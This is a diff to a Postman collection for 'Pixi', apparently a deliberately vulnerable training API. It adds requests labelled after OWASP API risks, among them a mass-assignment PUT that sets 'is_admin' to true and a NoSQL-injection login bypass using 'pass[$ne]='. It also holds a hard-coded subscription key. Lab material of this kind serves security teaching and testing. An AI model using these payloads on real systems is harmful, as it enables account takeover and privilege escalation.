@@ -1,6 +1,6 @@
 {
 	"info": {
-		"_postman_id": "be047ad9-f6ae-49ff-b070-235889401b6e",
+		"_postman_id": "6fff49e5-6440-4f76-a2d9-b8028dcec593",
 		"name": "Pixi",
 		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
 	},
@@ -101,7 +101,7 @@
 			"response": []
 		},
 		{
-			"name": "Get all Users",
+			"name": "API3: User  Data Leakage",
 			"request": {
 				"method": "GET",
 				"header": [
@@ -110,10 +110,30 @@
 						"value": "{{token}}"
 					}
 				],
-				"body": {
-					"mode": "raw",
-					"raw": ""
-				},
+				"url": {
+					"raw": "{{42c_url}}/api/user/info",
+					"host": [
+						"{{42c_url}}"
+					],
+					"path": [
+						"api",
+						"user",
+						"info"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "API 5: Get all Users list",
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "x-access-token",
+						"value": "{{token}}"
+					}
+				],
 				"url": {
 					"raw": "{{url}}/api/admin/all_users",
 					"host": [
@@ -129,38 +149,16 @@
 			"response": []
 		},
 		{
-			"name": "Get Logged User Info",
+			"name": "API6: Mass Assignment",
 			"request": {
-				"method": "GET",
+				"method": "PUT",
 				"header": [
 					{
-						"key": "x-access-token",
-						"value": "{{token}}"
-					}
-				],
-				"body": {
-					"mode": "raw",
-					"raw": ""
-				},
-				"url": {
-					"raw": "{{url}}/api/admin/all_users",
-					"host": [
-						"{{url}}"
-					],
-					"path": [
-						"api",
-						"admin",
-						"all_users"
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "Search for user",
-			"request": {
-				"method": "GET",
-				"header": [
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					},
 					{
 						"key": "x-access-token",
 						"value": "{{token}}",
@@ -169,28 +167,75 @@
 				],
 				"body": {
 					"mode": "raw",
-					"raw": ""
+					"raw": "{\n    \"email\": \"hacker@getme.in\",\n    \"password\": \"hellohello\",\n    \"name\": \"acme user1\",\n    \"is_admin\": true\n}"
 				},
 				"url": {
-					"raw": "{{42c_url}}/api/admin/users/search?search=user1",
+					"raw": "{{42c_url}}/api/user/edit_info",
 					"host": [
 						"{{42c_url}}"
 					],
 					"path": [
 						"api",
-						"admin",
-						"users",
-						"search"
+						"user",
+						"edit_info"
+					]
+				},
+				"description": "Become admin by mass assignment"
+			},
+			"response": []
+		},
+		{
+			"name": "API8: Forced Login via noSQL injection",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"id": "53354390-5811-4ab3-a99b-d11782b23fcd",
+						"exec": [
+							"var jsonData = pm.response.json();",
+							"pm.globals.set(\"token\", jsonData.token);"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/x-www-form-urlencoded",
+						"type": "text"
+					},
+					{
+						"key": "via-42c",
+						"value": "true",
+						"type": "text"
+					},
+					{
+						"key": "Ocp-Apim-Subscription-Key",
+						"value": "275365d441be476e8141a803f7a1f54f",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "user=bernard@ping.com&pass[$ne]="
+				},
+				"url": {
+					"raw": "{{42c_url}}/api/login",
+					"host": [
+						"{{42c_url}}"
 					],
-					"query": [
-						{
-							"key": "search",
-							"value": "user1"
-						}
+					"path": [
+						"api",
+						"login"
 					]
 				}
 			},
 			"response": []
 		}
-	]
+	],
+	"protocolProfileBehavior": {}
 }
